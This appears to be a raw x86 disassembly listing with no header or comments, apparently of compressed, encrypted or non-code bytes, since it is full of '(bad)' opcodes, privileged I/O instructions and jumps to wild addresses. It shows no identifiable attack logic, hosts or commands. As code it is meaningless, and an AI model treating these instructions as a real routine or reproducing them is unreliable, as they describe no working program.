  40be09:	mov    ecx,0x66989155
  40be0e:	dec    eax
  40be0f:	das    
  40be10:	pop    ds
  40be11:	inc    edi
  40be12:	xlat   BYTE PTR ds:[ebx]
  40be13:	int3   
  40be14:	cwde   
  40be15:	fnstsw WORD PTR [esi-0x731a9d47]
  40be1b:	pop    edx
  40be1c:	test   BYTE PTR [ecx],cl
  40be1e:	dec    ebp
  40be1f:	xchg   ebx,eax
  40be20:	and    BYTE PTR [ecx],cl
  40be22:	cmp    al,0xba
  40be24:	arpl   WORD PTR [ebp+0x4d],bp
  40be27:	mov    ds:0xc79a675e,al
  40be2c:	repz addr16 ss push esp
  40be30:	je     0x40be07
  40be32:	iret   
  40be33:	imul   ebx,DWORD PTR [edx+0x54efa528],0x69
  40be3a:	mov    ebx,0x7b3e79f2
  40be3f:	aaa    
  40be40:	add    ebp,DWORD PTR [ecx-0x25]
  40be43:	je     0x40be07
  40be45:	or     edx,ecx
  40be47:	push   esi
  40be48:	jle    0x40bddf
  40be4a:	rol    ebp,0xe9
  40be4d:	push   ecx
  40be4e:	xor    edi,edx
  40be50:	xor    DWORD PTR [edi-0x4f],ecx
  40be53:	sar    ebp,1
  40be55:	fistp  QWORD PTR [ebx-0x3d1ca4ef]
  40be5b:	add    BYTE PTR [ebx],al
  40be5d:	int3   
  40be5e:	enter  0x502e,0x9e
  40be62:	xchg   esp,eax
  40be63:	repz push ecx
  40be65:	jno    0x40be79
  40be67:	push   eax
  40be68:	jp     0x40be58
  40be6a:	or     eax,0x3d24c4a6
  40be6f:	inc    eax
  40be70:	dec    edx
  40be71:	inc    esp
  40be72:	outs   dx,BYTE PTR ds:[esi]
  40be73:	or     edx,ecx
  40be75:	pop    edi
  40be76:	mov    cs,WORD PTR [ebx+0x60]
  40be79:	pop    ss
  40be7a:	inc    edx
  40be7b:	pop    ds
  40be7c:	sbb    DWORD PTR [eax-0x1de68f1a],esp
  40be82:	push   edx
  40be83:	adc    ah,BYTE PTR [ebx+0x4a]
  40be86:	xor    eax,0x56f3e3ab
  40be8b:	pop    esp
  40be8c:	dec    ebp
  40be8d:	adc    al,0x4a
  40be8f:	mov    WORD PTR [ecx-0x10],cs
  40be92:	xchg   esi,eax
  40be93:	inc    esp
  40be94:	scas   eax,DWORD PTR es:[edi]
  40be95:	mov    dl,0xcd
  40be97:	es jg  0x40be56
  40be9a:	test   ch,dh
  40be9c:	pusha  
  40be9d:	gs loopne 0x40be3f
  40bea0:	lahf   
  40bea1:	sbb    ch,dl
  40bea3:	fcmovnbe st,st(7)
  40bea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bea6:	xor    DWORD PTR [esi],esi
  40bea8:	mov    cl,0x51
  40beaa:	sub    al,0xd3
  40beac:	and    BYTE PTR [edi],ah
  40beae:	call   0x4188b704
  40beb3:	outs   dx,BYTE PTR ds:[esi]
  40beb4:	popf   
  40beb5:	hlt    
  40beb6:	push   es
  40beb7:	out    0x2,al
  40beb9:	adc    DWORD PTR [ebx-0x6b01d1ef],esp
  40bebf:	cs pop si
  40bec2:	test   eax,0xfe57b5ec
  40bec7:	xchg   ebx,eax
  40bec8:	iret   
  40bec9:	lock rcl DWORD PTR [esp+edx*1+0x576ecdf7],cl
  40bed1:	aam    0x87
  40bed3:	gs mov edi,0xbb882806
  40bed9:	jo     0x40bf1a
  40bedb:	stc    
  40bedc:	mov    ds:0x864b6917,eax
  40bee1:	xor    cl,BYTE PTR [edx+0x7f]
  40bee4:	rcr    DWORD PTR [edi+0x59],0xfb
  40bee8:	das    
  40bee9:	pop    ecx
  40beea:	jle    0x40beae
  40beec:	pop    edx
  40beed:	test   bl,ah
  40beef:	aaa    
  40bef0:	outs   dx,BYTE PTR ds:[esi]
  40bef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bef2:	pop    eax
  40bef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bef4:	je     0x40be94
  40bef6:	setle  BYTE PTR es:[esi]
  40befa:	and    al,0xf7
  40befc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40befd:	mov    dh,0x25
  40beff:	lods   al,BYTE PTR ds:[esi]
  40bf00:	sub    BYTE PTR [ecx],cl
  40bf02:	pusha  
  40bf03:	ficom  DWORD PTR [edx-0x40]
  40bf06:	push   ss
  40bf07:	popf   
  40bf08:	or     ah,BYTE PTR [edx+0x489ba5fb]
  40bf0e:	imul   ebp,DWORD PTR fs:[eax+0x7c],0xa392fb2c
  40bf16:	bnd jg 0x40bf7e
  40bf19:	into   
  40bf1a:	(bad)  
  40bf1b:	ins    DWORD PTR es:[edi],dx
  40bf1c:	enter  0x960d,0x15
  40bf20:	sub    DWORD PTR [eax+0x1],esp
  40bf23:	adc    cl,cl
  40bf25:	aam    0x80
  40bf27:	loope  0x40bed1
  40bf29:	aam    0x34
  40bf2b:	loope  0x40bf47
  40bf2d:	arpl   WORD PTR [edi],di
  40bf2f:	cmp    al,0x87
  40bf31:	icebp  
  40bf32:	fsub   QWORD PTR [edx-0x73]
  40bf35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf36:	int    0x79
  40bf38:	jmp    0x84f06cb6
  40bf3d:	das    
  40bf3e:	std    
  40bf3f:	pop    ecx
  40bf40:	and    DWORD PTR [ecx-0x7f],0xffffffe8
  40bf44:	into   
  40bf45:	mov    cl,0x17
  40bf47:	push   cs
  40bf48:	dec    edx
  40bf49:	pushf  
  40bf4a:	fbld   TBYTE PTR [ebx-0x1c]
  40bf4d:	mov    bh,0xf2
  40bf4f:	xor    ebp,esi
  40bf51:	sub    ch,dh
  40bf53:	jle    0x40bf74
  40bf55:	inc    edx
  40bf56:	or     BYTE PTR [edx+0x2d0f40a6],bh
  40bf5c:	and    BYTE PTR [ebx-0x9],bl
  40bf5f:	js     0x40bf4e
  40bf61:	xor    eax,0x150a0ab5
  40bf66:	xor    eax,esp
  40bf68:	sti    
  40bf69:	call   0x468154d0
  40bf6e:	or     esi,0x72
  40bf71:	sbb    eax,0xe7cfae30
  40bf76:	data16 (bad) 
  40bf78:	dec    edi
  40bf79:	pop    ebp
  40bf7a:	aad    0x68
  40bf7c:	lds    esp,FWORD PTR [ebx-0x55]
  40bf7f:	push   esp
  40bf80:	test   BYTE PTR [esi+0x21027eaf],0x97
  40bf87:	icebp  
  40bf88:	loopne 0x40bfe7
  40bf8a:	sbb    edx,ecx
  40bf8c:	fld    DWORD PTR [edi-0x7ba97c11]
  40bf92:	mov    ds:0x60f72dca,al
  40bf97:	xchg   DWORD PTR [edx+eax*8],edx
  40bf9a:	sbb    ch,cl
  40bf9c:	adc    eax,0x9de584d7
  40bfa1:	push   cs
  40bfa2:	in     al,0xd7
  40bfa4:	inc    ebx
  40bfa5:	sub    bh,ah
  40bfa7:	stc    
  40bfa8:	push   edi
  40bfa9:	mov    esi,0xf2aae888
  40bfae:	jnp    0x40c007
  40bfb0:	retf   0x4da4
  40bfb3:	push   es
  40bfb4:	adc    DWORD PTR [esi-0x5b04aabc],esi
  40bfba:	or     al,0xda
  40bfbc:	add    cl,BYTE PTR [edi-0x59]
  40bfbf:	iret   
  40bfc0:	test   BYTE PTR [esi+0x38],ch
  40bfc3:	pop    esp
  40bfc4:	mov    edx,0x6d62ac6a
  40bfc9:	dec    esp
  40bfca:	jp     0x40bfee
  40bfcc:	mov    cl,0xb7
  40bfce:	loop   0x40c009
  40bfd0:	xchg   ebp,eax
  40bfd1:	rol    BYTE PTR [ebx-0x353aeae2],cl
  40bfd7:	test   BYTE PTR [edi],bh
  40bfd9:	add    eax,DWORD PTR [ebx+0x15]
  40bfdc:	jecxz  0x40c014
  40bfde:	xchg   esp,eax
  40bfdf:	mov    ch,0x8d
  40bfe1:	cli    
  40bfe2:	cmp    BYTE PTR [edx-0x69],al
  40bfe5:	and    BYTE PTR [ebx+0x3],0x3b
  40bfe9:	push   0x8fd32705
  40bfee:	(bad)  
  40bfef:	das    
  40bff0:	aam    0x3
  40bff2:	hlt    
  40bff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bff4:	add    eax,0x312a374d
  40bff9:	in     eax,0xb6
  40bffb:	daa    
  40bffc:	jmp    0xd9bceb1d
  40c001:	in     eax,0x8e
  40c003:	call   0x5e1a0532
  40c008:	cdq    
  40c009:	sbb    DWORD PTR [ecx-0xf],ebp
  40c00c:	(bad)  
  40c00e:	jno    0x40bfbf
  40c010:	repz adc ecx,edx
  40c013:	cli    
  40c014:	fcmovb st,st(4)
  40c016:	fcmovnbe st,st(6)
  40c018:	int3   
  40c019:	ror    dl,cl
  40c01b:	xchg   ecx,eax
  40c01c:	inc    edi
  40c01d:	scas   al,BYTE PTR es:[edi]
  40c01e:	xchg   esi,eax
  40c01f:	sbb    BYTE PTR [ebx],bh
  40c021:	jo     0x40c090
  40c023:	cdq    
  40c024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c025:	add    eax,0xc7d14962
  40c02a:	std    
  40c02b:	xor    edi,DWORD PTR [ebp+0xa745e22]
  40c031:	xchg   esi,eax
  40c032:	cmp    ch,BYTE PTR [ebp+0x44]
  40c035:	pop    edi
  40c036:	or     DWORD PTR [esi+0x34311437],esp
  40c03c:	into   
  40c03d:	or     esi,DWORD PTR [edx+0x28a54649]
  40c043:	sub    edx,DWORD PTR [edi]
  40c045:	addr16 push 0x5c8ef8b7
  40c04b:	xor    al,0x64
  40c04d:	push   esp
  40c04e:	retf   
  40c04f:	sub    eax,0xf17598a1
  40c054:	cmp    al,0x9e
  40c056:	out    0x63,al
  40c058:	popf   
  40c059:	sahf   
  40c05a:	dec    eax
  40c05b:	shl    ebp,cl
  40c05d:	lods   eax,DWORD PTR ds:[esi]
  40c05e:	pop    esi
  40c05f:	lahf   
  40c060:	xor    eax,0x281a9f65
  40c065:	psubusw mm5,QWORD PTR [eax-0x27edcf3d]
  40c06c:	mov    esp,0x9bec97a5
  40c071:	stc    
  40c072:	in     al,dx
  40c073:	inc    edx
  40c074:	mov    ebx,0x76077270
  40c079:	mov    edx,edx
  40c07b:	push   edi
  40c07c:	pop    ss
  40c07d:	repnz mov esi,0x159e668f
  40c083:	imul   edx
  40c085:	pushf  
  40c086:	test   dl,al
  40c088:	fmul   st(6),st
  40c08a:	add    al,bh
  40c08c:	dec    ecx
  40c08d:	xchg   esp,eax
  40c08e:	ffree  st(4)
  40c090:	call   0x1ef15e79
  40c095:	add    edx,ecx
  40c097:	dec    esp
  40c098:	out    0x13,eax
  40c09a:	mov    al,0x2b
  40c09c:	shl    DWORD PTR [bx+si-0x26],1
  40c0a0:	xlat   BYTE PTR ds:[ebx]
  40c0a1:	enter  0x2b11,0x28
  40c0a5:	dec    BYTE PTR [edx]
  40c0a7:	stc    
  40c0a8:	mov    dl,BYTE PTR [ebp-0x2b]
  40c0ab:	fistp  DWORD PTR [edi-0x36]
  40c0ae:	or     eax,0x53b5bf66
  40c0b3:	adc    ebx,ebx
  40c0b5:	sub    DWORD PTR [ebp+esi*4+0x683cb5dd],edi
  40c0bc:	cdq    
  40c0bd:	mov    bl,0x57
  40c0bf:	aaa    
  40c0c0:	call   0x4ed23bbe
  40c0c5:	cmc    
  40c0c6:	jge    0x40c07d
  40c0c8:	cdq    
  40c0c9:	js     0x40c11c
  40c0cb:	mov    eax,ds:0xe681b6a3
  40c0d0:	lods   eax,DWORD PTR ds:[esi]
  40c0d1:	adc    BYTE PTR [esi],cl
  40c0d3:	out    0xa5,al
  40c0d5:	popf   
  40c0d6:	dec    ebx
  40c0d7:	cs enter 0x13c2,0x86
  40c0dc:	adc    DWORD PTR [esi+0x4f39ee24],0x72
  40c0e3:	scas   eax,DWORD PTR es:[edi]
  40c0e4:	and    BYTE PTR [ebx+edi*4+0x25],bh
  40c0e8:	test   DWORD PTR [esi+0x48],esi
  40c0eb:	pop    eax
  40c0ec:	push   es
  40c0ed:	dec    esi
  40c0ee:	cmp    dh,BYTE PTR [ebp+0x52]
  40c0f1:	add    al,0xd0
  40c0f3:	pop    ebp
  40c0f4:	adc    al,0xdb
  40c0f6:	outs   dx,BYTE PTR ds:[esi]
  40c0f7:	jge    0x40c0c0
  40c0f9:	cmp    ebx,DWORD PTR [edi]
  40c0fb:	lea    edx,[ebx-0x8]
  40c0fe:	sub    bh,0x27
  40c101:	xor    dl,BYTE PTR ds:0x95478a1f
  40c107:	inc    ebx
  40c108:	test   eax,0xdb609a8c
  40c10d:	pop    edx
  40c10e:	cmp    esp,0xfffffff2
  40c111:	or     al,0x32
  40c113:	mov    ebx,DWORD PTR [ecx-0x39]
  40c116:	stos   DWORD PTR es:[edi],eax
  40c117:	dec    esp
  40c118:	mov    ah,0x2d
  40c11a:	push   0x154b553d
  40c11f:	cmp    esp,DWORD PTR [eax+0x19]
  40c122:	(bad)  
  40c123:	push   edx
  40c124:	fst    st(6)
  40c126:	pop    esp
  40c127:	inc    esp
  40c128:	lods   eax,DWORD PTR ds:[esi]
  40c129:	ss xchg edi,eax
  40c12b:	xor    DWORD PTR [edx+0x35851e0d],ecx
  40c131:	jmp    0xe040:0xdd42123c
  40c138:	lock jmp 0x637a:0xf1600f51
  40c140:	mov    al,ds:0xec78e0c
  40c145:	jle    0x40c10a
  40c147:	ins    BYTE PTR es:[edi],dx
  40c148:	out    dx,al
  40c149:	retf   
  40c14a:	push   cs
  40c14b:	adc    ch,BYTE PTR [eax-0x5]
  40c14e:	sub    BYTE PTR [ebp+0x6f],bh
  40c151:	mov    ebp,0x31b4d897
  40c156:	in     eax,dx
  40c157:	leave  
  40c158:	jp     0x40c1d6
  40c15a:	jns    0x40c0f7
  40c15c:	jge    0x40c132
  40c15e:	in     eax,0x6e
  40c160:	cld    
  40c161:	stc    
  40c162:	mov    ?,WORD PTR [ebx-0x466e7d1d]
  40c168:	pop    edx
  40c169:	retf   0xcb3c
  40c16c:	outs   dx,BYTE PTR ds:[esi]
  40c16d:	mov    cl,0x28
  40c16f:	xchg   ebx,eax
  40c170:	add    edx,DWORD PTR [ecx+0x20]
  40c173:	sbb    dh,BYTE PTR [ecx-0x40]
  40c176:	(bad)  
  40c177:	cld    
  40c178:	scas   eax,DWORD PTR es:[edi]
  40c179:	add    dl,BYTE PTR [esi+0x1a538a1a]
  40c17f:	sub    eax,0xd8d67e
  40c184:	push   0x1327534b
  40c189:	inc    ebx
  40c18a:	xor    ecx,DWORD PTR [edi+0x15526317]
  40c190:	ret    0x3173
  40c193:	or     dh,BYTE PTR [ebx-0xa6200b9]
  40c199:	adc    al,0x25
  40c19b:	sub    DWORD PTR [eax+esi*1-0x33278f61],eax
  40c1a2:	xchg   DWORD PTR [eax],ebx
  40c1a4:	std    
  40c1a5:	mov    al,ds:0x22b00f2a
  40c1aa:	xor    DWORD PTR [ecx],ebx
  40c1ac:	mov    cl,al
  40c1ae:	aaa    
  40c1af:	or     eax,edx
  40c1b1:	jo     0x40c14a
  40c1b3:	in     eax,dx
  40c1b4:	add    al,0x61
  40c1b6:	mov    ah,0x79
  40c1b8:	int    0xba
  40c1ba:	mov    BYTE PTR [ecx-0x4bbea020],ah
  40c1c0:	add    al,0x2c
  40c1c2:	or     dh,ah
  40c1c4:	dec    ecx
  40c1c5:	sbb    ebp,ecx
  40c1c7:	loopne 0x40c16f
  40c1c9:	inc    ebx
  40c1ca:	out    dx,al
  40c1cb:	std    
  40c1cc:	rol    DWORD PTR [ebx+esi*8-0x72e15698],1
  40c1d3:	leave  
  40c1d4:	adc    eax,0x905abb64
  40c1d9:	add    ebp,DWORD PTR [edx+eax*4-0x87efee4]
  40c1e0:	scas   eax,DWORD PTR es:[edi]
  40c1e1:	push   0x7c01a6a7
  40c1e6:	dec    ebp
  40c1e7:	and    eax,0x76e05fa5
  40c1ec:	stc    
  40c1ed:	dec    ebx
  40c1ee:	add    eax,0xa215c921
  40c1f3:	fwait
  40c1f4:	mov    eax,ds:0xbb4f7160
  40c1f9:	inc    esp
  40c1fa:	jge    0x40c1bc
  40c1fc:	int    0x81
  40c1fe:	outs   dx,DWORD PTR ds:[esi]
  40c1ff:	inc    ebp
  40c200:	mov    ds:0x74dde90,eax
  40c205:	scas   eax,DWORD PTR es:[edi]
  40c206:	stos   DWORD PTR es:[edi],eax
  40c207:	cmp    al,0xac
  40c209:	push   eax
  40c20a:	lods   al,BYTE PTR ds:[esi]
  40c20b:	out    0xfd,eax
  40c20d:	dec    esi
  40c20e:	fild   QWORD PTR [ebx]
  40c210:	fs push ds
  40c212:	outs   dx,DWORD PTR ds:[esi]
  40c213:	dec    eax
  40c214:	mov    ds:0xf9d33b14,eax
  40c219:	cmp    BYTE PTR [ebx-0x1c18d00d],ch
  40c21f:	pop    eax
  40c220:	xor    ch,dh
  40c222:	mov    ebx,0x7f97df0a
  40c227:	mov    bh,0xfc
  40c229:	rol    BYTE PTR [ebp-0x66],cl
  40c22c:	fst    QWORD PTR [esi-0x40]
  40c22f:	sub    BYTE PTR ds:0xfde55156,bh
  40c235:	dec    esp
  40c236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c237:	xchg   edx,eax
  40c238:	sub    al,0x96
  40c23a:	test   DWORD PTR [ebx],ecx
  40c23c:	pop    esp
  40c23d:	pop    ebx
  40c23e:	jne    0x40c298
  40c240:	jae    0x40c217
  40c242:	push   ebx
  40c243:	push   0x607fea74
  40c248:	sub    dh,cl
  40c24a:	pushf  
  40c24b:	inc    edi
  40c24c:	ja     0x90a8582e
  40c252:	les    esi,FWORD PTR [ebx]
  40c254:	sbb    ecx,esi
  40c256:	pusha  
  40c257:	sub    al,0x89
  40c259:	cmp    esp,ecx
  40c25b:	xor    DWORD PTR [ecx],eax
  40c25d:	imul   BYTE PTR [edi-0x433e9f57]
  40c263:	mov    cl,BYTE PTR [ecx+edi*1-0x6ee78d2a]
  40c26a:	cli    
  40c26b:	enter  0x9b34,0xb0
  40c26f:	dec    ecx
  40c270:	stos   BYTE PTR es:[edi],al
  40c271:	mov    ah,0xe0
  40c273:	stc    
  40c274:	loope  0x40c2ad
  40c276:	dec    ecx
  40c277:	sbb    DWORD PTR [ebx+0x70b52bbe],0xffffffc0
  40c27e:	lahf   
  40c27f:	rcl    ah,1
  40c281:	je     0x40c223
  40c283:	mov    ah,0x1d
  40c285:	cmp    al,0x29
  40c287:	ret    0x11bf
  40c28a:	test   BYTE PTR [ebx+0x30],0xdc
  40c28e:	(bad)  
  40c28f:	xor    ch,BYTE PTR [edx+0x3ce3a488]
  40c295:	fsubp  st(1),st
  40c297:	jl     0x40c30d
  40c299:	push   es
  40c29a:	pop    edi
  40c29b:	mov    edx,0xca97619b
  40c2a0:	and    ah,dh
  40c2a2:	pop    edx
  40c2a3:	pop    esi
  40c2a4:	xor    al,0xeb
  40c2a6:	push   cs
  40c2a7:	dec    ebx
  40c2a8:	jp     0x40c279
  40c2aa:	mov    bh,0x71
  40c2ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2ad:	jne    0x40c240
  40c2af:	fsubr  QWORD PTR ds:0x49db40f8
  40c2b5:	sar    BYTE PTR [eax+0x71],cl
  40c2b8:	adc    ebp,DWORD PTR ds:0xab5690d0
  40c2be:	pop    ss
  40c2bf:	test   eax,0x811b699c
  40c2c4:	push   esp
  40c2c5:	aad    0x2b
  40c2c7:	adc    esi,DWORD PTR [edx]
  40c2c9:	fisubr DWORD PTR [ebx+0x1e216c2e]
  40c2cf:	sub    ecx,DWORD PTR [edi+0x12]
  40c2d2:	dec    ebp
  40c2d3:	sbb    eax,0xc4c1d118
  40c2d8:	repnz icebp 
  40c2da:	shl    DWORD PTR gs:[eax+0x675f4984],cl
  40c2e1:	lods   al,BYTE PTR gs:[esi]
  40c2e3:	sbb    ebx,DWORD PTR [ebx-0x71]
  40c2e6:	and    edx,ecx
  40c2e8:	repz push ss
  40c2ea:	jb     0x40c350
  40c2ec:	sbb    DWORD PTR [ecx-0x2b],ebp
  40c2ef:	shr    bl,0x5f
  40c2f2:	push   ss
  40c2f3:	add    eax,0x1da85417
  40c2f8:	out    0x51,al
  40c2fa:	ds mov ebp,0x53828725
  40c300:	push   cs
  40c301:	adc    DWORD PTR [eax+ecx*1],eax
  40c304:	mov    ch,0xc5
  40c306:	mov    ds:0xa5f1282e,al
  40c30b:	sbb    edx,DWORD PTR [edx]
  40c30d:	push   es
  40c30e:	loop   0x40c351
  40c310:	(bad)  
  40c311:	shl    DWORD PTR [ebx],0xfb
  40c314:	ficomp DWORD PTR [esi-0x61]
  40c317:	mov    ecx,0x795348a9
  40c31c:	lds    ebx,FWORD PTR [eax-0x6cd3fba7]
  40c322:	das    
  40c323:	mov    edx,0xf70fa36e
  40c328:	jmp    0x1e57816b
  40c32d:	jge    0x40c301
  40c32f:	pop    esp
  40c330:	call   DWORD PTR [ecx+edx*8+0x47]
  40c334:	pop    eax
  40c335:	imul   edx,DWORD PTR [edx+0x3ac88740],0xfffffff8
  40c33c:	fld    DWORD PTR [edi-0x43e65f3f]
  40c342:	pop    edi
  40c343:	add    eax,0x96ddd772
  40c348:	jmp    0x40c34f
  40c34a:	jns    0x40c2ee
  40c34c:	add    DWORD PTR [eax],ecx
  40c34e:	cmp    BYTE PTR [ebp+0x52],bl
  40c351:	inc    esp
  40c352:	cmc    
  40c353:	cs fs ret 
  40c356:	lahf   
  40c357:	mov    ds:0xc60e738b,al
  40c35c:	fs inc eax
  40c35e:	mov    ecx,DWORD PTR [ebx+0x43]
  40c361:	leave  
  40c362:	xor    al,0x4
  40c364:	mov    esp,0xbbd2a1d1
  40c369:	add    bh,bl
  40c36b:	sbb    DWORD PTR [esi-0x52],ecx
  40c36e:	(bad)  
  40c36f:	cmp    DWORD PTR [esi+0x7d27052a],eax
  40c375:	in     al,0x5
  40c377:	mov    edx,0x6c33f75e
  40c37c:	pop    ecx
  40c37d:	xchg   BYTE PTR [edi+0x65],bl
  40c380:	ror    ebp,0x44
  40c383:	fpatan 
  40c385:	pop    ebx
  40c386:	cli    
  40c387:	pop    ebx
  40c388:	sbb    BYTE PTR [esi],bl
  40c38a:	ins    DWORD PTR es:[edi],dx
  40c38b:	pop    esi
  40c38c:	adc    esp,0xffffffe4
  40c38f:	out    dx,al
  40c390:	enter  0x8e1a,0x24
  40c394:	ds xor al,0x70
  40c397:	mov    DWORD PTR [esi-0x48bf1317],edi
  40c39d:	mov    bl,0xc6
  40c39f:	sub    eax,0xe32e62de
  40c3a4:	cs fwait
  40c3a6:	xor    ah,BYTE PTR [ebp+0x526780fa]
  40c3ac:	inc    esi
  40c3ad:	add    dl,ch
  40c3af:	push   ebp
  40c3b0:	pop    esi
  40c3b1:	cmp    ah,BYTE PTR [edi]
  40c3b3:	and    esi,0xd9f31a18
  40c3b9:	push   edi
  40c3ba:	xor    al,0x6
  40c3bc:	mov    ds:0xf38c3dc9,eax
  40c3c1:	xchg   dl,bl
  40c3c3:	fiadd  WORD PTR [ebp+0x366d3cf9]
  40c3c9:	fs add ecx,esi
  40c3cc:	icebp  
  40c3cd:	xor    ebx,DWORD PTR [ecx-0x5d0e4a09]
  40c3d3:	add    ecx,DWORD PTR [ebx+0x3b20b7d6]
  40c3d9:	fstp   QWORD PTR [edi]
  40c3db:	xor    eax,0xfa49d37f
  40c3e0:	pop    eax
  40c3e1:	jge    0x40c3a9
  40c3e3:	mov    al,0x57
  40c3e5:	mov    BYTE PTR [esi-0x7c345af],bl
  40c3eb:	jns    0x40c36e
  40c3ed:	ret    
  40c3ee:	into   
  40c3ef:	sub    DWORD PTR [ebp-0x4f],eax
  40c3f2:	jmp    0x8b29:0x928d443a
  40c3f9:	push   ebx
  40c3fa:	or     DWORD PTR [edx+0x1c],ebp
  40c3fd:	adc    edx,DWORD PTR [ebx*4-0x47ca6eac]
  40c404:	xchg   esi,eax
  40c405:	push   0x149d3c03
  40c40a:	stos   BYTE PTR es:[edi],al
  40c40b:	sub    DWORD PTR [edi],esp
  40c40d:	je     0x40c3be
  40c40f:	pop    edi
  40c410:	(bad)
  40c414:	dec    ecx
  40c415:	or     DWORD PTR [esi+0x6b],ecx
  40c418:	lock not DWORD PTR [ebx]
  40c41b:	xor    BYTE PTR [eax+0x4daf06dd],0xfb
  40c422:	mov    bl,0x30
  40c424:	push   ebp
  40c425:	test   eax,0xa0e2cf2e
  40c42a:	into   
  40c42b:	xlat   BYTE PTR ds:[ebx]
  40c42c:	pop    ebp
  40c42d:	dec    ebx
  40c42e:	in     al,dx
  40c42f:	push   es
  40c430:	mov    bl,0x3
  40c432:	fcom   DWORD PTR [edx+0x21f9dd39]
  40c438:	(bad)  
  40c43a:	or     ah,BYTE PTR [ecx]
  40c43c:	xchg   edx,eax
  40c43d:	out    0x4d,eax
  40c43f:	iret   
  40c440:	xor    al,0x96
  40c443:	sub    edx,esp
  40c445:	icebp  
  40c446:	add    BYTE PTR [ecx],bl
  40c448:	and    dl,cl
  40c44a:	pusha  
  40c44b:	mov    edi,DWORD PTR [eax+0x55e3f330]
  40c451:	retf   0x942b
  40c454:	enter  0xa33c,0xd0
  40c458:	push   edi
  40c459:	push   cs
  40c45a:	(bad)  
  40c45b:	stc    
  40c45c:	add    al,0xd3
  40c45e:	lods   eax,DWORD PTR ds:[esi]
  40c45f:	pop    edx
  40c460:	iret   
  40c461:	pusha  
  40c462:	in     eax,dx
  40c463:	and    al,0x14
  40c465:	and    al,0x4f
  40c467:	mov    esi,edx
  40c469:	rcl    edi,cl
  40c46b:	pop    ds
  40c46c:	jmp    0x40c3fc
  40c46e:	xchg   edi,eax
  40c46f:	xchg   edx,eax
  40c470:	pop    edi
  40c471:	mov    bh,BYTE PTR [eax-0x457f2e15]
  40c477:	add    eax,0xf52ca919
  40c47c:	xchg   edi,eax
  40c47d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c47e:	cmp    DWORD PTR [edx+0x39ae7],0x23df13aa
  40c488:	mov    ah,BYTE PTR [ecx+0x124714ea]
  40c48e:	xchg   bl,bl
  40c490:	mov    esi,0x1c5749e3
  40c495:	fadd   DWORD PTR [esi-0x7a]
  40c498:	lods   eax,DWORD PTR ds:[esi]
  40c499:	mov    ds:0xcb6d54dc,al
  40c49e:	fs inc edx
  40c4a0:	mov    esp,0xbcd2fbe0
  40c4a5:	(bad)  
  40c4a6:	test   ebx,0x2985f14e
  40c4ac:	pop    ss
  40c4ad:	sub    BYTE PTR [ebx],0x8c
  40c4b0:	test   al,0x3e
  40c4b2:	cmp    BYTE PTR [ebp-0x7e40a385],dl
  40c4b8:	adc    eax,0x4546c96a
  40c4bd:	cmp    bl,dl
  40c4bf:	repz shl BYTE PTR [edi+0x2f],1
  40c4c3:	in     al,0x1f
  40c4c5:	push   cs
  40c4c6:	push   0x2d
  40c4c8:	loope  0x40c4e4
  40c4ca:	add    DWORD PTR [edx-0x5b],0xf5e9144a
  40c4d1:	or     cl,BYTE PTR ds:[ecx-0x34]
  40c4d5:	test   al,0xe5
  40c4d7:	or     BYTE PTR [edx-0x7a6e43a0],bh
  40c4dd:	es aaa 
  40c4df:	jae    0x40c549
  40c4e1:	pop    es
  40c4e2:	inc    ebp
  40c4e3:	adc    edi,edx
  40c4e5:	jmp    0x40c4b9
  40c4e7:	aam    0x92
  40c4e9:	and    eax,0x964247e3
  40c4ee:	les    ebx,FWORD PTR [edx-0x725a2346]
  40c4f4:	imul   eax,DWORD PTR es:[ebx+eax*8+0x17],0x5725f9da
  40c4fd:	lea    ebx,[eax-0x47817d73]
  40c503:	(bad)  [ecx+0x1a]
  40c506:	aaa    
  40c507:	ins    BYTE PTR es:[edi],dx
  40c508:	lea    esi,[edx]
  40c50a:	enter  0x6eef,0x7f
  40c50e:	mov    WORD PTR [ebx+edx*2-0x22],ds
  40c512:	dec    edi
  40c513:	add    eax,0xcd911f31
  40c518:	fistp  QWORD PTR [esi-0xe2c1949]
  40c51e:	add    bh,BYTE PTR [ebp+eiz*2+0x79]
  40c522:	leave  
  40c523:	push   ds
  40c524:	xlat   BYTE PTR ds:[ebx]
  40c525:	inc    ebp
  40c526:	in     al,dx
  40c527:	gs cmp al,0xee
  40c52a:	cmp    eax,0x7ed66a1f
  40c52f:	adc    al,0xa2
  40c531:	inc    ecx
  40c532:	loop   0x40c4c7
  40c534:	nop
  40c535:	push   esi
  40c536:	inc    eax
  40c537:	jae    0x40c4c3
  40c539:	call   0xeb1d:0x33127465
  40c540:	push   edx
  40c541:	inc    edi
  40c542:	xchg   edx,esi
  40c544:	push   eax
  40c545:	aas    
  40c546:	and    ebx,esp
  40c548:	les    ebx,FWORD PTR [ecx-0x7c]
  40c54b:	xchg   ecx,eax
  40c54c:	inc    esp
  40c54d:	shl    BYTE PTR [edi-0x2f],cl
  40c550:	ret    0x6747
  40c553:	inc    edx
  40c554:	and    al,0x75
  40c556:	mov    ds:0x3ed22fc9,eax
  40c55b:	ficom  DWORD PTR [ebx+0x4d820fe1]
  40c562:	adc    ecx,edi
  40c564:	sub    DWORD PTR ds:[edi+0x1],edi
  40c568:	xchg   esp,eax
  40c569:	sub    DWORD PTR [esi+eax*1-0x6473282e],ecx
  40c570:	jns    0x40c5ba
  40c572:	retf   
  40c573:	and    BYTE PTR [ecx],0x64
  40c576:	mov    esp,0x7e3bde95
  40c57b:	or     DWORD PTR [ebx+esi*8-0x4a],eax
  40c57f:	mov    cs,WORD PTR [ebp-0x3b]
  40c582:	xor    ecx,DWORD PTR [edx]
  40c584:	cli    
  40c585:	aam    0x82
  40c587:	dec    ecx
  40c588:	outs   dx,BYTE PTR ds:[esi]
  40c589:	dec    ebp
  40c58a:	sub    bl,BYTE PTR [esi]
  40c58c:	mov    ds:0xf1ade799,eax
  40c591:	lock lods eax,DWORD PTR ds:[esi]
